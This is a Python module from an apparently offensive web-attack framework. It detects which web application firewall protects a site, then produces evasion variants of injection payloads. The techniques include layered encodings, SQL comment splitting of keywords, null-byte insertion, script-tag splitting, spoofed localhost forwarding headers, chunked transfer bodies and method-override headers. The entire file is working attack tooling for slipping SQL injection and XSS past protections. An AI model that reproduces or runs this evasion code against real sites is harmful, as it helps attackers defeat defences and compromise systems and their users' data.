#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v8.0 - ULTIMATE EDITION
WAF Bypass Module - Advanced techniques
"""

import re
import random


from config import Colors


class WAFBypass:
    """WAF Bypass Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "WAF Bypass"
    
    def detect_waf(self, url: str) -> list:
        """Detect WAF type"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf_clearance'],
            'AWS WAF': ['awselb', 'aws-waf', 'x-amzn-requestid'],
            'ModSecurity': ['mod_security', 'ModSecurity', 'NOYB'],
            'Sucuri': ['sucuri', 'x-sucuri', 'sucuri_cloudproxy'],
            'Incapsula': ['incap_ses', 'visid_incap', 'incapsula'],
            'Akamai': ['akamai', 'ak_bmsc', 'x-akamai-transformed'],
            'F5 BIG-IP': ['bigip', 'f5', 'x-waf-status'],
            'Imperva': ['incap_ses', 'visid_incap', 'imperva'],
            'Barracuda': ['barra'],
            'Fortinet': ['fortigate', 'fgd'],
            'Wordfence': ['wordfence', 'wf'],
            'Citrix': ['citrix', 'ns_af'],
            'Radware': ['radware', 'x-info'],
        }
        
        try:
            response = self.requester.request(url, 'GET')
            
            if not response:
                return []
            
            headers = str(response.headers).lower()
            cookies = str(response.cookies).lower()
            content = response.text.lower()
            
            detected = []
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in headers or sig.lower() in cookies or sig.lower() in content:
                        detected.append(waf)
                        break
            
            return detected
            
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'WAF detection error: {e}')}")
            return []
    
    def bypass_techniques(self, payload: str, waf_type: str = None) -> list:
        """Generate WAF bypass variants"""
        variants = [payload]
        
        # URL encoding
        variants.append(self._url_encode(payload))
        variants.append(self._double_url_encode(payload))
        
        # Case randomization
        variants.append(self._random_case(payload))
        
        # Comment injection (SQL specific)
        if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR']):
            variants.append(self._comment_injection(payload))
        
        # Unicode encoding
        variants.append(self._unicode_encode(payload))
        
        # HTML entities
        variants.append(self._html_entities(payload))
        
        # Hex encoding
        variants.append(self._hex_encode(payload))
        
        # Null byte injection
        variants.append(self._null_byte(payload))
        
        # Tab/space substitution
        variants.append(self._whitespace_substitution(payload))
        
        # Keyword splitting
        variants.append(self._keyword_splitting(payload))
        
        return list(set(variants))
    
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return ''.join(f'%25{ord(c):02x}' for c in payload)
    
    def _random_case(self, payload: str) -> str:
        """Randomize case"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    def _comment_injection(self, payload: str) -> str:
        """Inject SQL comments"""
        sql_keywords = {
            'SELECT': 'SEL/**/ECT',
            'UNION': 'UNI/**/ON',
            'AND': 'AN/**/D',
            'OR': 'O/**/R',
            'FROM': 'FR/**/OM',
            'WHERE': 'WHE/**/RE',
            'ORDER': 'ORD/**/ER',
            'GROUP': 'GR/**/OUP',
            'BY': 'B/**/Y',
            'INSERT': 'INS/**/ERT',
            'UPDATE': 'UP/**/DATE',
            'DELETE': 'DEL/**/ETE',
        }
        
        result = payload
        for keyword, replacement in sql_keywords.items():
            result = re.sub(re.escape(keyword), replacement, result, flags=re.IGNORECASE)
        
        return result
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'%u{ord(c):04x}' for c in payload)
    
    def _html_entities(self, payload: str) -> str:
        """HTML entity encode"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _null_byte(self, payload: str) -> str:
        """Insert null bytes"""
        # Insert null byte at common injection points
        return payload.replace('.', '%00.').replace('/', '%00/')
    
    def _whitespace_substitution(self, payload: str) -> str:
        """Substitute whitespace"""
        # Replace spaces with SQL comments or tab characters
        result = payload.replace(' ', '/**/')
        return result
    
    def _keyword_splitting(self, payload: str) -> str:
        """Split keywords with junk characters"""
        # Insert junk characters that are ignored
        return payload.replace('<script>', '<scr ipt>').replace('alert', 'al\\x65rt')
    
    def generate_bypass_request(self, url: str, method: str = 'GET', 
                                data: dict = None, headers: dict = None) -> dict:
        """Generate request with WAF bypass headers"""
        bypass_headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Proto': 'https',
            'X-HTTP-Host-Override': 'localhost',
            'Forwarded': 'for=127.0.0.1;by=127.0.0.1;host=localhost',
        }
        
        if headers:
            bypass_headers.update(headers)
        
        return {
            'url': url,
            'method': method,
            'data': data,
            'headers': bypass_headers,
        }
    
    def advanced_bypass(self, payload: str, waf_type: str = None) -> list:
        """Advanced WAF bypass with evasion engine integration"""
        variants = self.bypass_techniques(payload, waf_type)
        
        try:
            from utils.evasion import PayloadMutator
            mutator = PayloadMutator()
            
            variants.append(mutator.mutate(payload, 'encode_chain'))
            variants.append(mutator.mutate(payload, 'mixed_encode'))
            variants.append(mutator.mutate(payload, 'case_alternate'))
            
            if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR']):
                variants.append(mutator.mutate(payload, 'comment_inject'))
                variants.append(mutator.mutate(payload, 'concat_split'))
                variants.append(mutator.mutate(payload, 'whitespace_random'))
            
            if '<' in payload or 'script' in payload.lower():
                variants.append(mutator.mutate(payload, 'html_entity'))
                variants.append(mutator.mutate(payload, 'js_obfuscate'))
        except Exception:
            pass
        
        return list(set(variants))
    
    def generate_chunked_request(self, url: str, payload: str) -> dict:
        """Generate Transfer-Encoding chunked request for WAF bypass"""
        chunk_size = random.randint(1, 4)
        chunks = []
        i = 0
        while i < len(payload):
            end = min(i + chunk_size, len(payload))
            chunk_data = payload[i:end]
            chunks.append(f"{len(chunk_data):x}\r\n{chunk_data}\r\n")
            i = end
            chunk_size = random.randint(1, 4)
        chunks.append("0\r\n\r\n")
        
        return {
            'url': url,
            'headers': {
                'Transfer-Encoding': 'chunked',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'body': ''.join(chunks),
        }
    
    def method_override_bypass(self, url: str, data: dict = None) -> list:
        """Generate requests with HTTP method override headers"""
        overrides = [
            {'X-HTTP-Method': 'PUT'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-Method-Override': 'PUT'},
            {'X-HTTP-Method': 'PATCH'},
        ]
        
        results = []
        for override in overrides:
            results.append({
                'url': url,
                'method': 'POST',
                'data': data,
                'headers': override,
            })
        return results
